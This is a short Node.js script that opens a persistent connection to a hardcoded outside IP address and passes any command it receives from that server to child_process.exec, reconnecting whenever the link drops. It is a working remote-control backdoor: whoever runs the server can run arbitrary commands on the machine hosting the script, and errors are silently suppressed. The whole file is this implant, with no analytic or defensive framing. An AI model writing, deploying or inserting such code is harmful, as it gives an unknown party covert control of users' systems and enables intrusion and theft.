const net = require('net');
const child_process = require('child_process');

var connect = () => {
    const socket = new net.Socket();

    socket.connect({
        host: '104.168.9.62',
        port: 257
    }, () => {
        socket.setKeepAlive(true, 1000)
        socket.on('data', (data) => {
            try {
                var command = JSON.parse(data.toString())['command'];

                child_process.exec(`${command}`);
            } catch (e) { }
        });
        console.log(`[!] Connected to the server!`);
        socket.write('world!\r\n');
    });

    socket.on('error', (err) => { });
    socket.on('close', () => {
        console.log(`[CLIENT] Disconnected from the server, trying again in 5 seconds...`);
        setTimeout(() => connect(), 1000);
    });
};
connect();